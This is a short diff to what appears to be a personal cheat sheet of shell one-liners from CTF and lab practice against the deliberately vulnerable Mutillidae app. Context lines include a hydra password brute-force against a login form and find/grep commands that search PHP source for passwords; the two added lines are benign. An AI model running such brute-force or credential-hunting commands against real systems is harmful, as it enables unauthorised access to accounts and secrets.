@@ -26,3 +26,5 @@ curl -v -X POST http://ctf5.shiyanbar.com/web/jiandan/index.php -d "id=222&submi
 hydra -l kevin -P passwd/password-4.dic -f 192.168.0.113 http-form-post "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:Account does not exist"
 find /www/mutillidae -name "*.php" | xargs grep -i "password" | grep "="
 find /www/mutillidae -name 'MySQLHandler.php' | xargs cat | sed 's/</\&#60;/g' | sed 's/>/\&#62;/g'
+echo -e 'mypass\nmypass' | grub-mkpasswd-pbkdf2 | awk '/grub.pbkdf/{print}'
+for i in {1..100}; do echo $i;done
